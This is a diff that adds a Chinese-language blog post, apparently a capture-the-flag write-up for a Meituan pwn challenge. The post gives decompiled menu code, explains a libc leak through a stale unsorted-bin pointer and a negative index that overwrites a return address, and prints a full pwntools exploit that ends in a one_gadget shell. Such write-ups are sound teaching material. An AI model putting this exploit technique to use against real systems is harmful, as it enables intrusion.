@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a1ph0nse.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="美团的题，看起来是堆题，但实际上用的是栈溢出，主要漏洞是数组下标越界。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mt note">
+<meta property="og:url" content="https://a1ph0nse.github.io/2023/01/02/mt_note/index.html">
+<meta property="og:site_name" content="a1ph0nse">
+<meta property="og:description" content="美团的题，看起来是堆题，但实际上用的是栈溢出，主要漏洞是数组下标越界。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-01-02T11:54:26.000Z">
+<meta property="article:modified_time" content="2023-01-02T16:12:20.000Z">
+<meta property="article:author" content="a1ph0nse">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="stackoverflow">
+<meta property="article:tag" content="index overflow">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://a1ph0nse.github.io/2023/01/02/mt_note/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>mt note | a1ph0nse</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">a1ph0nse</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个菜狗的挣扎</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a1ph0nse.github.io/2023/01/02/mt_note/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="a1ph0nse">
+      <meta itemprop="description" content="pwn菜狗、cs菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a1ph0nse">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          mt note
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-01-02 19:54:26" itemprop="dateCreated datePublished" datetime="2023-01-02T19:54:26+08:00">2023-01-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-01-03 00:12:20" itemprop="dateModified" datetime="2023-01-03T00:12:20+08:00">2023-01-03</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-wp/" itemprop="url" rel="index"><span itemprop="name">pwn_wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>美团的题，看起来是堆题，但实际上用的是栈溢出，主要漏洞是数组下标越界。</p>
+<span id="more"></span>
+
+<p>64位菜单，只开了NX</p>
+<p>有build、delete、modify、display四个功能</p>
+<p>build</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">build</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  _BYTE idx[<span class="number">12</span>]; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)idx = (<span class="type">unsigned</span> <span class="type">int</span>)get_idx(a1);   <span class="comment">// 最多同时build16个,0~15</span></span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)idx == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No free space already&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  size = get_input();</span><br><span class="line">  <span class="keyword">if</span> ( !size || size &gt; <span class="number">0x1FF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Not allowed&quot;</span>);</span><br><span class="line">  *(_QWORD *)&amp;idx[<span class="number">4</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *(<span class="type">void</span> **)&amp;idx[<span class="number">4</span>], size);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16LL</span> * *(<span class="type">int</span> *)idx) = *(_QWORD *)&amp;idx[<span class="number">4</span>];</span><br><span class="line">  result = size;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">16LL</span> * *(<span class="type">int</span> *)idx + <span class="number">8</span>) = size;<span class="comment">// 有个地方存着size</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>delete</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_4013F3</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  idx = get_input();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0x10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Not allowed&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)(<span class="number">16LL</span> * idx + a1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nothing here&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">16LL</span> * idx + a1));</span><br><span class="line">  *(_QWORD *)(<span class="number">16LL</span> * idx + a1) = <span class="number">0LL</span>;</span><br><span class="line">  *(_DWORD *)(<span class="number">16LL</span> * idx + a1 + <span class="number">8</span>) = <span class="number">0</span>;         <span class="comment">// 有个小UAF</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>modify</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_4014B6</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  idx = get_input();</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">16</span> || !*(_QWORD *)(<span class="number">16LL</span> * idx + a1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Not allowed&quot;</span>);</span><br><span class="line">  buf = *(<span class="type">void</span> **)(<span class="number">16LL</span> * idx + a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, *(<span class="type">int</span> *)(<span class="number">16LL</span> * idx + a1 + <span class="number">8</span>));<span class="comment">// 只能写size大小，但index可以为负数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>display</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_401580</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  idx = get_input();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0x10</span> &amp;&amp; *(_QWORD *)(<span class="number">16LL</span> * idx + a1) )</span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">&quot;Content: %s\n&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)(<span class="number">16LL</span> * idx + a1));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Not allowed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有个小UAF，释放了一个chunk之后，重新malloc的时候虽然会重新写一些内容，但原有的内容不会清空（如果没有覆盖的话）。</p>
+<p>可以先将chunk放入unsorted bin，再次malloc的时候只写入8byte，这样bk处仍保存有unsorted bin头的地址，借此可以泄露libc。</p>
+<p>除此之外，modify中存在<strong>下标负溢出</strong>，并且由于堆块指针存储在栈上，因此可以利用下标负溢出改写返回地址，调整寄存器的值后执行one_gadget</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">&quot;./note2&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./note2&quot;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;39.106.78.22&#x27;</span>,<span class="number">35569</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">size,content</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;5. leave\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">display</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;5. leave\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line"> 	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">idx,content</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&quot;5. leave\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line"> 	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> 	p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line"> 	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line"> 	p.recvuntil(<span class="string">&quot;5. leave\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line"> 	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> 	p.recvuntil(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line"> 	gdb.attach(p,<span class="string">&#x27;b* 0x401714&#x27;</span>)</span><br><span class="line"> 	pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">build(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#idx0</span></span><br><span class="line">build(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#idx1</span></span><br><span class="line">build(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#3,4,5,6,7,8,9</span></span><br><span class="line">	build(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	delete(<span class="number">3</span>+i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):<span class="comment">#1,3,4,5,6,7,8</span></span><br><span class="line">	build(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">build(<span class="number">0x30</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x8</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">display(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak=u64(p.recvline()[<span class="number">8</span>:<span class="number">14</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">unsort=leak-<span class="number">0x80</span></span><br><span class="line">mhook=unsort-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">libcbase=mhook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">free_hook=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;unsorted bin: &quot;</span>+<span class="built_in">hex</span>(unsort))</span><br><span class="line">log.info(<span class="string">&quot;libcbase : &quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">log.info(<span class="string">&quot;malloc hook : &quot;</span>+<span class="built_in">hex</span>(mhook))</span><br><span class="line">log.info(<span class="string">&quot;free hook : &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#pop 0x00000000004017ac</span></span><br><span class="line">pop_addr= <span class="number">0x00000000004017ac</span></span><br><span class="line"><span class="comment">#modify(-6,p64(0)+p64(libcbase+one_gadget[0]))</span></span><br><span class="line"><span class="comment">#pop r12 r15 to satisfy one_gadget</span></span><br><span class="line">modify(-<span class="number">6</span>,p64(<span class="number">0</span>)+p64(pop_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(libcbase+one_gadget[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/stackoverflow/" rel="tag"># stackoverflow</a>
+              <a href="/tags/index-overflow/" rel="tag"># index overflow</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/02/hide/" rel="prev" title="hide">
+      <i class="fa fa-chevron-left"></i> hide
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/02/ez_linklist/" rel="next" title="ez_linklist">
+      ez_linklist <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="a1ph0nse"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">a1ph0nse</p>
+  <div class="site-description" itemprop="description">pwn菜狗、cs菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">a1ph0nse</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
